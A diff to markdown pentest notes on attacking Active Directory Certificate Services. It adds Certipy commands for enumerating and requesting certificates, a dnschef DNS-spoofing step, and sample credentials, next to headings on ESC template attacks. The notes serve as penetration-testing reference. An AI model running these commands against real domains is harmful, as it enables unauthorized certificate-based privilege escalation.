@@ -21,6 +21,19 @@ Find the CA from Windows : `certutil –config – -ping`
 
 Enumerate the HTTP ports on the servers, enumerate the shares to find **CertEnroll**, etc
 
+
+
+## Request a certificate
+
+```
+Certipy certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhoun
+```
+
+```
+sudo dnschef --fakeip 10.9.10.10
+proxychains -q certipy req -u Robet.Ortiz -p <password> -dc-ip cydc.cyber.local -ns 127.0.0.1 -template CyberSigning -a CYBER-CA -debug
+```
+
 ## Template Attacks - ESC1, 2, 3, 9 & 10
 
 [![image-1640805125672.png](https://hideandsec.sh/uploads/images/gallery/2021-12/scaled-1680-/mlK5E1SH1D1CzLOG-image-1640805125672.png)](https://hideandsec.sh/uploads/images/gallery/2021-12/mlK5E1SH1D1CzLOG-image-1640805125672.png)
